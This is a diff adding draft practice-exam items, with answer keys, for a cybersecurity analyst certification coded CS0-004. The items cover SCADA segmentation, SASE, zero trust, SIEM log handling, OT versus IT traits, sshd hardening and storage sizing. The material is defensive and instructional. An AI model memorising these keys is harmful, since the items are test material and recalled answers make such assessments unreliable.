+      "correct": [
+        "c",
+        "e"
+      ]
+    },
+    "explanation": "A secrets manager keeps values out of code and images, and rotation limits how long a leaked value stays useful. Baking keys into images, emailing tokens and sharing one key everywhere all increase the number of places a secret can leak.",
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-mcq-032",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "mcq-multi",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 3,
+    "stem": "Which TWO controls suit a SCADA network?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Run active full scans against live controllers during production"
+        },
+        {
+          "id": "b",
+          "text": "Segment the SCADA network from corporate IT behind a controlled boundary"
+        },
+        {
+          "id": "c",
+          "text": "Allow vendor remote access through one shared account"
+        },
+        {
+          "id": "d",
+          "text": "Place the operator HMI on the guest wireless network"
+        },
+        {
+          "id": "e",
+          "text": "Monitor control traffic passively for unexpected commands"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b",
+        "e"
+      ]
+    },
+    "explanation": "Segmentation limits how far an intrusion from corporate IT can travel, and passive monitoring spots unexpected commands without disturbing controllers. Active scans can halt fragile devices, and shared vendor accounts and guest wireless remove accountability and isolation.",
+    "acronyms": [
+      "HMI",
+      "IT",
+      "SCADA"
+    ],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-mcq-033",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "mcq-multi",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 2,
+    "stem": "Which TWO capabilities are typically delivered as part of a SASE service?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A hypervisor for hosting guest virtual machines"
+        },
+        {
+          "id": "b",
+          "text": "Secure web gateway filtering"
+        },
+        {
+          "id": "c",
+          "text": "Physical badge readers for office doors"
+        },
+        {
+          "id": "d",
+          "text": "Cloud access security broker controls"
+        },
+        {
+          "id": "e",
+          "text": "Firmware flashing for field controllers"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b",
+        "d"
+      ]
+    },
+    "explanation": "SASE bundles cloud-delivered security functions such as a secure web gateway and a CASB alongside networking. Hypervisors, badge readers and controller firmware tools are unrelated to it.",
+    "acronyms": [
+      "CASB",
+      "SASE"
+    ],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-diagram-001",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "pbq-diagram",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 2,
+    "pbqWeight": 4,
+    "stem": "A company moves its payroll app behind zero trust access. Place the best control for each need named below the access path.",
+    "payload": {
+      "width": 600,
+      "height": 220,
+      "nodes": [
+        {
+          "id": "n1",
+          "x": 10,
+          "y": 20,
+          "w": 130,
+          "h": 50,
+          "text": "Remote laptop"
+        },
+        {
+          "id": "n2",
+          "x": 160,
+          "y": 20,
+          "w": 130,
+          "h": 50,
+          "text": "Access broker"
+        },
+        {
+          "id": "n3",
+          "x": 310,
+          "y": 20,
+          "w": 130,
+          "h": 50,
+          "text": "Policy engine"
+        },
+        {
+          "id": "n4",
+          "x": 460,
+          "y": 20,
+          "w": 130,
+          "h": 50,
+          "text": "Payroll app"
+        }
+      ],
+      "edges": [
+        {
+          "from": "n1",
+          "to": "n2"
+        },
+        {
+          "from": "n2",
+          "to": "n3"
+        },
+        {
+          "from": "n3",
+          "to": "n4"
+        }
+      ],
+      "zones": [
+        {
+          "id": "z1",
+          "x": 10,
+          "y": 120,
+          "name": "Confirm the device meets the security baseline"
+        },
+        {
+          "id": "z2",
+          "x": 160,
+          "y": 120,
+          "name": "Confirm the user with a second factor"
+        },
+        {
+          "id": "z3",
+          "x": 310,
+          "y": 120,
+          "name": "Limit the session to the one app requested"
+        },
+        {
+          "id": "z4",
+          "x": 460,
+          "y": 120,
+          "name": "Keep a record of every access decision"
+        }
+      ],
+      "labels": [
+        {
+          "id": "l1",
+          "text": "Full-subnet VPN tunnel"
+        },
+        {
+          "id": "l2",
+          "text": "MFA prompt"
+        },
+        {
+          "id": "l3",
+          "text": "Decision logging to the SIEM"
+        },
+        {
+          "id": "l4",
+          "text": "Endpoint posture check"
+        },
+        {
+          "id": "l5",
+          "text": "Per-application access"
+        },
+        {
+          "id": "l6",
+          "text": "Allow list of office IP addresses"
+        }
+      ]
+    },
+    "answer": {
+      "placements": {
+        "z1": "l4",
+        "z2": "l2",
+        "z3": "l5",
+        "z4": "l3"
+      }
+    },
+    "explanation": "Zero trust verifies the device, verifies the user, grants access to one application and logs each decision. A subnet-wide tunnel and an office address allow list both rely on network location, which zero trust does not trust.",
+    "partExplanations": {
+      "z1": "A posture check proves the laptop meets the baseline before access is granted.",
+      "z2": "An MFA prompt adds a second factor to confirm the person.",
+      "z3": "Per-application access gives the session reach to the requested app and nothing else on the network.",
+      "z4": "Logging each decision to the SIEM provides the audit trail for later review."
+    },
+    "acronyms": [
+      "IP",
+      "MFA",
+      "SIEM",
+      "VPN"
+    ],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-config-001",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "pbq-config",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 2,
+    "pbqWeight": 5,
+    "stem": "Configure log handling on a domain controller that forwards to the SIEM. Policy: protect events in transit, keep every host's clock aligned, let only the logging service write the local log while the security group reads it, keep 30 days searchable and 12 months in total, and record both successful and failed privilege use.",
+    "payload": {
+      "fields": [
+        {
+          "id": "transport",
+          "label": "Forwarding transport",
+          "options": [
+            {
+              "id": "tls",
+              "text": "TLS-protected TCP to the collector"
+            },
+            {
+              "id": "udp",
+              "text": "Plain UDP to the collector"
+            },
+            {
+              "id": "mail",
+              "text": "Daily email of the log file"
+            }
+          ]
+        },
+        {
+          "id": "time",
+          "label": "Time source",
+          "options": [
+            {
+              "id": "local",
+              "text": "Each host's own unsynchronized clock"
+            },
+            {
+              "id": "ntp",
+              "text": "Two internal NTP servers"
+            },
+            {
+              "id": "manual",
+              "text": "A manual change at each patch cycle"
+            }
+          ]
+        },
+        {
+          "id": "perms",
+          "label": "Local log file permissions",
+          "options": [
+            {
+              "id": "admin",
+              "text": "Write for any administrator who needs to edit entries"
+            },
+            {
+              "id": "all",
+              "text": "Read and write for all local users"
+            },
+            {
+              "id": "svc",
+              "text": "Write for the logging service, read for the security group"
+            }
+          ]
+        },
+        {
+          "id": "retain",
+          "label": "Retention",
+          "options": [
+            {
+              "id": "tiered",
+              "text": "30 days searchable, then archive to a 12-month total"
+            },
+            {
+              "id": "del30",
+              "text": "Delete everything after 30 days"
+            },
+            {
+              "id": "forever",
+              "text": "Keep all events searchable with no end date"
+            }
+          ]
+        },
+        {
+          "id": "audit",
+          "label": "Privilege use auditing",
+          "options": [
+            {
+              "id": "fail",
+              "text": "Failed attempts only"
+            },
+            {
+              "id": "both",
+              "text": "Successful and failed attempts"
+            },
+            {
+              "id": "none",
+              "text": "Disabled to save performance"
+            }
+          ]
+        }
+      ]
+    },
+    "answer": {
+      "values": {
+        "transport": "tls",
+        "time": "ntp",
+        "perms": "svc",
+        "retain": "tiered",
+        "audit": "both"
+      }
+    },
+    "explanation": "TLS protects events on the wire, synchronized time keeps events from different hosts in order, restricted write access protects integrity, tiered retention meets both the search and the total period, and auditing success as well as failure shows who actually used privilege.",
+    "partExplanations": {
+      "transport": "TLS-protected TCP keeps events confidential and intact in transit; plain UDP and email do not.",
+      "time": "Internal NTP servers keep clocks aligned so events from different hosts can be ordered.",
+      "perms": "Only the logging service writes and the security group reads, so nobody can quietly edit entries.",
+      "retain": "Searchable for 30 days and archived to 12 months meets both parts of the policy.",
+      "audit": "Successful privilege use shows what an account did, not only what it failed to do."
+    },
+    "acronyms": [
+      "NTP",
+      "SIEM",
+      "TCP",
+      "TLS",
+      "UDP"
+    ],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-match-001",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "pbq-match",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 2,
+    "pbqWeight": 5,
+    "stem": "Match each logging problem to the concept that addresses it.",
+    "payload": {
+      "prompts": [
+        {
+          "id": "p1",
+          "text": "Two servers record the same event with timestamps seven minutes apart"
+        },
+        {
+          "id": "p2",
+          "text": "Raw log lines cannot be searched by a source address field"
+        },
+        {
+          "id": "p3",
+          "text": "An auditor doubts that archived files were unchanged after collection"
+        },
+        {
+          "id": "p4",
+          "text": "Storage fills with records far older than any policy needs"
+        },
+        {
+          "id": "p5",
+          "text": "File deletions never appear in the logs at all"
+        }
+      ],
+      "choices": [
+        {
+          "id": "c1",
+          "text": "Parsing and normalization"
+        },
+        {
+          "id": "c2",
+          "text": "A retention schedule"
+        },
+        {
+          "id": "c3",
+          "text": "Audit configuration"
+        },
+        {
+          "id": "c4",
+          "text": "Time synchronization"
+        },
+        {
+          "id": "c5",
+          "text": "Hashing and signing"
+        }
+      ]
+    },
+    "answer": {
+      "pairs": {
+        "p1": "c4",
+        "p2": "c1",
+        "p3": "c5",
+        "p4": "c2",
+        "p5": "c3"
+      }
+    },
+    "explanation": "Each problem lines up with one logging concept: clocks, field extraction, integrity, retention and what the audit policy records.",
+    "partExplanations": {
+      "p1": "Seven minutes of skew means the clocks are not synchronized.",
+      "p2": "Parsing and normalization turn raw lines into named fields during ingestion.",
+      "p3": "Hashing and signing let a reviewer prove that archived files were not altered.",
+      "p4": "A retention schedule deletes or archives records once they are no longer needed.",
+      "p5": "If deletions are never recorded, the audit configuration does not cover them."
+    },
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-buckets-001",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "pbq-buckets",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 1,
+    "pbqWeight": 6,
+    "stem": "Sort each characteristic into the environment where it is typical.",
+    "payload": {
+      "buckets": [
+        {
+          "id": "ot",
+          "text": "Typical of OT environments"
+        },
+        {
+          "id": "it",
+          "text": "Typical of enterprise IT"
+        }
+      ],
+      "items": [
+        {
+          "id": "i1",
+          "text": "Safety and uptime outrank data confidentiality"
+        },
+        {
+          "id": "i2",
+          "text": "Patches are applied in a monthly cycle with reboots"
+        },
+        {
+          "id": "i3",
+          "text": "Controllers stay in service for 15 to 30 years"
+        },
+        {
+          "id": "i4",
+          "text": "Laptops and servers are refreshed every few years"
+        },
+        {
+          "id": "i5",
+          "text": "Many devices speak vendor-specific protocols such as Modbus"
+        },
+        {
+          "id": "i6",
+          "text": "Routine active scans are normally safe on hosts"
+        }
+      ]
+    },
+    "answer": {
+      "placements": {
+        "i1": "ot",
+        "i2": "it",
+        "i3": "ot",
+        "i4": "it",
+        "i5": "ot",
+        "i6": "it"
+      }
+    },
+    "explanation": "OT puts safety and availability first, keeps equipment for decades and uses specialized protocols. Enterprise IT patches on a regular cycle, refreshes hardware often and tolerates routine scanning.",
+    "partExplanations": {
+      "i1": "Plant safety and continuous operation come before confidentiality in OT.",
+      "i2": "Regular patch cycles with reboots are normal in enterprise IT.",
+      "i3": "Industrial controllers often run for decades, which leaves old firmware in service.",
+      "i4": "Frequent hardware refresh is typical of laptops and servers.",
+      "i5": "Industrial equipment often uses specialized protocols such as Modbus.",
+      "i6": "Routine active scanning is usually safe on IT hosts, unlike fragile controllers."
+    },
+    "acronyms": [
+      "IT",
+      "OT"
+    ],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-hotspot-001",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "pbq-hotspot",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 2,
+    "pbqWeight": 3,
+    "stem": "The baseline for an internet-facing jump host requires key-only logins, no direct root access and no graphical forwarding. Select every setting in this sshd configuration that breaks the baseline.",
+    "payload": {
+      "width": 480,
+      "height": 220,
+      "nodes": [
+        {
+          "id": "n1",
+          "x": 10,
+          "y": 10,
+          "w": 220,
+          "h": 40,
+          "text": "PubkeyAuthentication yes"
+        },
+        {
+          "id": "n2",
+          "x": 250,
+          "y": 10,
+          "w": 220,
+          "h": 40,
+          "text": "PermitRootLogin yes"
+        },
+        {
+          "id": "n3",
+          "x": 10,
+          "y": 90,
+          "w": 220,
+          "h": 40,
+          "text": "MaxAuthTries 3"
+        },
+        {
+          "id": "n4",
+          "x": 250,
+          "y": 90,
+          "w": 220,
+          "h": 40,
+          "text": "PasswordAuthentication yes"
+        },
+        {
+          "id": "n5",
+          "x": 10,
+          "y": 170,
+          "w": 220,
+          "h": 40,
+          "text": "AllowGroups jump-users"
+        },
+        {
+          "id": "n6",
+          "x": 250,
+          "y": 170,
+          "w": 220,
+          "h": 40,
+          "text": "X11Forwarding yes"
+        }
+      ],
+      "spots": [
+        {
+          "id": "pubkey",
+          "x": 10,
+          "y": 10,
+          "w": 220,
+          "h": 40,
+          "name": "PubkeyAuthentication yes"
+        },
+        {
+          "id": "root",
+          "x": 250,
+          "y": 10,
+          "w": 220,
+          "h": 40,
+          "name": "PermitRootLogin yes"
+        },
+        {
+          "id": "tries",
+          "x": 10,
+          "y": 90,
+          "w": 220,
+          "h": 40,
+          "name": "MaxAuthTries 3"
+        },
+        {
+          "id": "password",
+          "x": 250,
+          "y": 90,
+          "w": 220,
+          "h": 40,
+          "name": "PasswordAuthentication yes"
+        },
+        {
+          "id": "groups",
+          "x": 10,
+          "y": 170,
+          "w": 220,
+          "h": 40,
+          "name": "AllowGroups jump-users"
+        },
+        {
+          "id": "x11",
+          "x": 250,
+          "y": 170,
+          "w": 220,
+          "h": 40,
+          "name": "X11Forwarding yes"
+        }
+      ]
+    },
+    "answer": {
+      "selected": [
+        "root",
+        "password",
+        "x11"
+      ]
+    },
+    "explanation": "Direct root login, password logins and graphical forwarding each break the stated baseline. Key authentication, a low retry limit and a group restriction support it.",
+    "partExplanations": {
+      "pubkey": "Public key logins are what the baseline requires, so this setting is fine.",
+      "root": "Allowing direct root login breaks the no-root rule.",
+      "tries": "A low retry limit slows guessing and is consistent with hardening.",
+      "password": "Password logins break the key-only requirement.",
+      "groups": "Restricting logins to a named group supports least privilege.",
+      "x11": "Graphical forwarding is unneeded on a jump host and breaks the baseline."
+    },
+    "acronyms": [],
+    "status": "draft"
+  },
+  {
+    "id": "cs4-1-1-data-001",
+    "exam": "CS0-004",
+    "source": "ours",
+    "type": "pbq-data",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "difficulty": 2,
+    "pbqWeight": 4,
+    "stem": "Use the daily log volume table to size storage for the SIEM.",
+    "payload": {
+      "caption": "Average daily log ingest by source (gigabytes per day)",
+      "columns": [
+        "Source",
+        "Gigabytes per day"
+      ],
+      "rows": [
+        [
+          "Firewalls",
+          "60"
+        ],
+        [
+          "Web proxy",
+          "40"
+        ],
+        [
+          "Endpoints",
+          "50"
+        ],
+        [
+          "Directory servers",
+          "20"
+        ],
+        [
+          "Cloud services",
+          "30"
+        ]
+      ],
+      "chart": {
+        "kind": "bar",
+        "labelColumn": 0,
+        "valueColumn": 1
+      },
+      "fields": [
+        {
+          "id": "total",
+          "label": "Total daily ingest (gigabytes)",
+          "options": [
+            {
+              "id": "t200",
+              "text": "200"
+            },
+            {
+              "id": "t180",
+              "text": "180"
+            },
+            {
+              "id": "t260",
+              "text": "260"
+            }
+          ]
+        },
+        {
+          "id": "share",
+          "label": "Share of daily ingest from firewalls",
+          "options": [
+            {
+              "id": "s20",
+              "text": "20%"
+            },
+            {
+              "id": "s30",
+              "text": "30%"
+            },
+            {
+              "id": "s40",
+              "text": "40%"
+            }
+          ]
+        },
+        {
+          "id": "hot",
+          "label": "Storage for 30 days of searchable data (gigabytes)",
+          "options": [
+            {
+              "id": "h600",
+              "text": "600"
+            },
+            {
+              "id": "h60k",
+              "text": "60,000"
+            },
+            {
+              "id": "h6k",
+              "text": "6,000"
+            }
+          ]
+        },
+        {
+          "id": "arch",
+          "label": "Archive size for the other 335 days of a 365-day retention, compressed 5 to 1 (gigabytes)",
+          "options": [
+            {
+              "id": "a146",
+              "text": "14,600"
+            },
+            {
+              "id": "a134",
+              "text": "13,400"
+            },
+            {
+              "id": "a670",
+              "text": "67,000"
+            }
+          ]
+        }
+      ]
+    },
+    "answer": {
+      "values": {
+        "total": "t200",
+        "share": "s30",
+        "hot": "h6k",
+        "arch": "a134"
+      }
+    },
+    "explanation": "The sources add to 200 gigabytes a day. Firewalls are 60 of 200, or 30%. Thirty days of searchable data is 200 x 30 = 6,000, and the remaining 335 days is 200 x 335 = 67,000, which compresses 5 to 1 to 13,400.",
+    "partExplanations": {
+      "total": "60 + 40 + 50 + 20 + 30 = 200 gigabytes per day.",
+      "share": "60 / 200 = 0.30, which is 30%.",
+      "hot": "200 x 30 = 6,000 gigabytes.",
+      "arch": "200 x 335 = 67,000 gigabytes, divided by 5 gives 13,400; 14,600 wrongly compresses all 365 days."
+    },
+    "acronyms": [
+      "SIEM"
+    ],
+    "status": "draft"
+  }
+]
